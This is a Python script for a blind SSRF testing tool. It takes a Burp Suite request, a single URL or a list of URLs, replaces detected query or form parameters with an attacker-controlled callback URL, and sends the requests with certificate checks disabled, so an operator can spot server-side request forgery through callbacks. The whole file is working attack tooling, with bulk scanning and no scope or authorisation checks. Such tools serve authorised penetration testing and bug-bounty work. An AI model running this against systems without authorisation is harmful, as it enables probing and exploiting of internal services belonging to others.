#!/usr/bin/env python3
"""
SSRF Blind Validation Tool
"""

import argparse
import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import urllib3
from colorama import init, Fore, Style
import time

# Initialize colorama
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BRIGHT = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

class Icons:
    SUCCESS = "✅"
    ERROR = "❌"
    WARNING = "⚠️"
    INFO = "🔹"
    TARGET = "🎯"
    ROCKET = "🚀"
    FIRE = "🔥"
    LIST = "📄"

class SSRFBlindTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.total_requests = 0
        self.successful_requests = 0
    
    def print_banner(self):
        """Print colored banner with ASCII art"""
        banner = f"""
{Colors.BRIGHT}{Colors.RED}
███████ ███████ ██████  ███████     ██████  ██      ██ ███    ██ ██████  
██      ██      ██   ██ ██          ██   ██ ██      ██ ████   ██ ██   ██ 
███████ ███████ ██████  █████       ██████  ██      ██ ██ ██  ██ ██   ██ 
     ██      ██ ██   ██ ██          ██   ██ ██      ██ ██  ██ ██ ██   ██ 
███████ ███████ ██   ██ ██          ██████  ███████ ██ ██   ████ ██████  
{Colors.BRIGHT}{Colors.CYAN}
╔═══════════════════════════════════════════════════════════════╗
║               {Icons.FIRE} {Colors.BRIGHT}{Colors.MAGENTA}SSRF BLIND VALIDATION TOOL {Colors.CYAN}{Icons.FIRE}                ║
║                        by Mr r00t                             ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
        print(banner)
    
    def print_success(self, message):
        """Print success message"""
        print(f"{Colors.GREEN}{Icons.SUCCESS} {message}{Colors.RESET}")
    
    def print_error(self, message):
        """Print error message"""
        print(f"{Colors.RED}{Icons.ERROR} {message}{Colors.RESET}")
    
    def print_info(self, message):
        """Print info message"""
        print(f"{Colors.CYAN}{Icons.INFO} {message}{Colors.RESET}")
    
    def print_warning(self, message):
        """Print warning message"""
        print(f"{Colors.YELLOW}{Icons.WARNING} {message}{Colors.RESET}")
    
    def parse_burp_request(self, file_path):
        """Parse Burp Suite file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            lines = content.strip().split('\n')
            
            # Parse first line
            first_line = lines[0].split()
            method = first_line[0]
            path_with_params = first_line[1]
            
            # Parse headers and get Host
            headers = {}
            body = ""
            body_started = False
            host = ""
            
            for line in lines[1:]:
                if not line.strip() and not body_started:
                    body_started = True
                    continue
                
                if not body_started:
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
                        if key.strip().lower() == 'host':
                            host = value.strip()
                else:
                    body += line + '\n'
            
            body = body.strip()
            
            # Build complete URL
            if not host:
                self.print_error("No Host header found in request")
                return None
            
            scheme = 'https' if host.endswith(':443') else 'http'
            full_url = f"{scheme}://{host}{path_with_params}"
            
            # Parse URL parameters
            url_params = {}
            parsed_url = urlparse(full_url)
            if parsed_url.query:
                url_params = parse_qs(parsed_url.query)
                for key, value in url_params.items():
                    if isinstance(value, list) and len(value) == 1:
                        url_params[key] = value[0]
            
            # Parse body parameters
            body_params = {}
            if body and 'application/x-www-form-urlencoded' in headers.get('Content-Type', ''):
                body_params = parse_qs(body)
                for key, value in body_params.items():
                    if isinstance(value, list) and len(value) == 1:
                        body_params[key] = value[0]
            elif body:
                body_params = {'raw_data': body}
            
            return {
                'method': method,
                'full_url': full_url,
                'headers': headers,
                'body': body,
                'url_params': url_params,
                'body_params': body_params
            }
            
        except Exception as e:
            self.print_error(f"Error parsing request file: {e}")
            return None

    def parse_url_request(self, url, method='GET', headers=None, body=None):
        """Parse direct URL request"""
        try:
            # Parse URL and extract parameters
            parsed_url = urlparse(url)
            
            # Extract URL parameters
            url_params = {}
            if parsed_url.query:
                url_params = parse_qs(parsed_url.query)
                for key, value in url_params.items():
                    if isinstance(value, list) and len(value) == 1:
                        url_params[key] = value[0]
            
            # Parse body parameters if provided
            body_params = {}
            if body:
                if headers and 'application/x-www-form-urlencoded' in headers.get('Content-Type', ''):
                    body_params = parse_qs(body)
                    for key, value in body_params.items():
                        if isinstance(value, list) and len(value) == 1:
                            body_params[key] = value[0]
                else:
                    body_params = {'raw_data': body}
            
            # Set default headers if not provided
            if not headers:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': '*/*'
                }
            
            return {
                'method': method.upper(),
                'full_url': url,
                'headers': headers,
                'body': body,
                'url_params': url_params,
                'body_params': body_params
            }
            
        except Exception as e:
            self.print_error(f"Error parsing URL: {e}")
            return None

    def load_urls_from_file(self, file_path):
        """Load and parse URLs from a file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            parsed_requests = []
            for url in urls:
                burp_request = self.parse_url_request(url)
                if burp_request:
                    parsed_requests.append(burp_request)
            
            return parsed_requests
            
        except Exception as e:
            self.print_error(f"Error loading URLs from file: {e}")
            return []

    def detect_parameters(self, burp_request):
        """Automatically detect all parameters in the request"""
        all_params = []
        
        # Detect URL parameters
        if burp_request['url_params']:
            all_params.extend(burp_request['url_params'].keys())
        
        # Detect body parameters (excluding raw data)
        if burp_request['body_params'] and 'raw_data' not in burp_request['body_params']:
            all_params.extend(burp_request['body_params'].keys())
        
        return all_params

    def inject_callback(self, params, callback_domain, target_parameters=None):
        """Inject callback into parameters"""
        injected_params = {}
        
        for key, value in params.items():
            if isinstance(value, str) and value.strip():
                if target_parameters:
                    if key in target_parameters:
                        injected_params[key] = f"http://{callback_domain}/"
                    else:
                        injected_params[key] = value
                else:
                    injected_params[key] = f"http://{callback_domain}/"
        
        return injected_params

    def send_ssrf_request(self, burp_request, callback_domain, target_parameters=None, request_number=None, total_requests=None):
        """Send SSRF request"""
        try:
            # Inject callback into URL parameters
            parsed_url = urlparse(burp_request['full_url'])
            injected_url_params = self.inject_callback(
                burp_request['url_params'], 
                callback_domain, 
                target_parameters
            )
            
            # Rebuild URL
            new_query = urlencode(injected_url_params)
            target_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # Inject callback into body if needed
            injected_body = burp_request['body']
            if burp_request['body'] and 'application/x-www-form-urlencoded' in burp_request['headers'].get('Content-Type', ''):
                injected_body_params = self.inject_callback(
                    burp_request['body_params'], 
                    callback_domain, 
                    target_parameters
                )
                injected_body = urlencode(injected_body_params)
            
            # Display request information
            if request_number and total_requests:
                print(f"\n{Colors.BRIGHT}{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                print(f"{Colors.BRIGHT}{Colors.MAGENTA}{Icons.LIST} Request {request_number}/{total_requests}{Colors.RESET}")
            
            print(f"{Colors.BRIGHT}{Colors.CYAN}HTTP Method:{Colors.RESET} {Colors.YELLOW}{burp_request['method']}{Colors.RESET}")
            print(f"{Colors.BRIGHT}{Colors.CYAN}Target URL:{Colors.RESET} {Colors.WHITE}{target_url}{Colors.RESET}")
            print(f"{Colors.BRIGHT}{Colors.CYAN}Callback:{Colors.RESET} {Colors.MAGENTA}http://{callback_domain}/{Colors.RESET}")
            
            if target_parameters:
                print(f"{Colors.BRIGHT}{Colors.CYAN}Target Parameters:{Colors.RESET} {Colors.YELLOW}{', '.join(target_parameters)}{Colors.RESET}")
            
            # Send the request
            print(f"\n{Colors.BRIGHT}{Colors.YELLOW}{Icons.ROCKET} Sending SSRF request...{Colors.RESET}")
            
            response = self.session.request(
                method=burp_request['method'],
                url=target_url,
                headers=burp_request['headers'],
                data=injected_body,
                timeout=10,
                allow_redirects=False
            )
            
            # Show response status
            status_color = Colors.GREEN if response.status_code < 400 else Colors.YELLOW
            print(f"{Colors.BRIGHT}{Colors.CYAN}Response Status:{Colors.RESET} {status_color}{response.status_code}{Colors.RESET}")
            
            self.total_requests += 1
            self.successful_requests += 1
            return True
            
        except Exception as e:
            self.print_error(f"Failed to send request: {e}")
            self.total_requests += 1
            return False

    def process_url_list(self, file_path, callback_domain, target_parameters=None, delay=0):
        """Process a list of URLs from file"""
        try:
            # Load URLs from file
            urls = self.load_urls_from_file(file_path)
            if not urls:
                self.print_error("No valid URLs found in the file")
                return False
            
            self.print_info(f"Loaded {len(urls)} URLs from file: {file_path}")
            
            # Process each URL
            for i, url_request in enumerate(urls, 1):
                # Auto-detect parameters if none specified
                current_target_params = target_parameters
                if not current_target_params:
                    detected_params = self.detect_parameters(url_request)
                    if detected_params:
                        current_target_params = detected_params
                        self.print_warning(f"Auto-detected parameters for URL {i}: {', '.join(detected_params)}")
                    else:
                        self.print_warning(f"No parameters detected in URL {i}, skipping...")
                        continue
                
                # Send SSRF request
                success = self.send_ssrf_request(
                    url_request, 
                    callback_domain, 
                    current_target_params,
                    request_number=i,
                    total_requests=len(urls)
                )
                
                # Add delay between requests if specified
                if delay > 0 and i < len(urls):
                    self.print_info(f"Waiting {delay} seconds before next request...")
                    time.sleep(delay)
            
            return True
            
        except Exception as e:
            self.print_error(f"Error processing URL list: {e}")
            return False

def main():
    tester = SSRFBlindTester()
    tester.print_banner()
    
    parser = argparse.ArgumentParser(
        description='SSRF Blind Validation Tool - Automated Burp Suite Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.BRIGHT}{Colors.CYAN}Usage Examples:{Colors.RESET}
{Colors.GREEN}  # Test all parameters from Burp file{Colors.RESET}
  {Colors.DIM}python3 SSRFBlind.py -r request.txt -c your-callback.com{Colors.RESET}

{Colors.GREEN}  # Test specific parameter in URL{Colors.RESET}
  {Colors.DIM}python3 SSRFBlind.py -u "https://example.com/api?url=test&endpoint=data" -c your-callback.com -p url{Colors.RESET}

{Colors.GREEN}  # Test multiple URLs from file with auto detection{Colors.RESET}
  {Colors.DIM}python3 SSRFBlind.py -l urls.txt -c your-callback.com{Colors.RESET}

{Colors.GREEN}  # Test specific parameters in URL list{Colors.RESET}
  {Colors.DIM}python3 SSRFBlind.py -l urls.txt -c your-callback.com -p url,redirect{Colors.RESET}
        """
    )
    
    # Input source group
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument('-r', '--request', 
                           help='Burp Suite request file path')
    input_group.add_argument('-u', '--url',
                           help='Direct URL to test')
    input_group.add_argument('-l', '--list',
                           help='File containing list of URLs to test')
    
    # Common arguments
    parser.add_argument('-c', '--callback', required=True,
                       help='Callback domain to receive requests')
    parser.add_argument('-p', '--parameter', action='append',
                       help='Specific parameters to inject (can be used multiple times)')
    parser.add_argument('--delay', type=float, default=0,
                       help='Delay in seconds between requests (for URL list mode)')
    
    # URL-specific arguments
    parser.add_argument('-m', '--method', default='GET',
                       help='HTTP method for URL testing (default: GET)')
    parser.add_argument('-d', '--data',
                       help='POST data for URL testing')
    parser.add_argument('--headers', action='append',
                       help='Additional headers (format: "Header: Value")')
    
    args = parser.parse_args()
    
    # Process target parameters
    target_parameters = []
    if args.parameter:
        for param in args.parameter:
            target_parameters.extend([p.strip() for p in param.split(',') if p.strip()])
    
    # Process based on input type
    if args.list:
        # URL list mode
        tester.print_info(f"Starting bulk URL testing from: {args.list}")
        if target_parameters:
            tester.print_info(f"Testing specific parameters: {', '.join(target_parameters)}")
        else:
            tester.print_warning("No specific parameters provided. Auto-detecting parameters for each URL.")
        
        success = tester.process_url_list(
            args.list, 
            args.callback, 
            target_parameters if target_parameters else None,
            args.delay
        )
        
    elif args.request:
        # Burp file mode
        burp_request = tester.parse_burp_request(args.request)
        if not burp_request:
            sys.exit(1)
        
        # Auto-detect parameters if none specified
        if not target_parameters:
            all_params = tester.detect_parameters(burp_request)
            if all_params:
                tester.print_warning(f"No specific parameters provided. Testing all detected parameters: {', '.join(all_params)}")
                target_parameters = all_params
            else:
                tester.print_error("No parameters detected in the request and none specified.")
                sys.exit(1)
        
        success = tester.send_ssrf_request(
            burp_request, 
            args.callback, 
            target_parameters if target_parameters else None
        )
        
    else:
        # Single URL mode
        # Parse headers
        headers = {}
        if args.headers:
            for header in args.headers:
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()
        
        burp_request = tester.parse_url_request(
            args.url, 
            args.method, 
            headers, 
            args.data
        )
        if not burp_request:
            sys.exit(1)
        
        # Auto-detect parameters if none specified
        if not target_parameters:
            all_params = tester.detect_parameters(burp_request)
            if all_params:
                tester.print_warning(f"No specific parameters provided. Testing all detected parameters: {', '.join(all_params)}")
                target_parameters = all_params
            else:
                tester.print_error("No parameters detected in the URL and none specified.")
                sys.exit(1)
        
        success = tester.send_ssrf_request(
            burp_request, 
            args.callback, 
            target_parameters if target_parameters else None
        )
    
    # Display final results
    print(f"\n{Colors.BRIGHT}{Colors.CYAN}{'═' * 60}{Colors.RESET}")
    print(f"{Colors.BRIGHT}{Colors.CYAN}SCAN SUMMARY{Colors.RESET}")
    print(f"{Colors.BRIGHT}{Colors.CYAN}{'═' * 60}{Colors.RESET}")
    
    if args.list:
        print(f"{Colors.BRIGHT}{Colors.CYAN}Total URLs processed:{Colors.RESET} {Colors.WHITE}{tester.total_requests}{Colors.RESET}")
        print(f"{Colors.BRIGHT}{Colors.CYAN}Successful requests:{Colors.RESET} {Colors.GREEN}{tester.successful_requests}{Colors.RESET}")
        print(f"{Colors.BRIGHT}{Colors.CYAN}Failed requests:{Colors.RESET} {Colors.RED}{tester.total_requests - tester.successful_requests}{Colors.RESET}")
    
    if success or (args.list and tester.successful_requests > 0):
        tester.print_success("SSRF testing completed!")
        tester.print_info(f"Monitor your callback: http://{args.callback}/")
    else:
        tester.print_error("SSRF testing failed or no requests were successful")

if __name__ == "__main__":
    main()
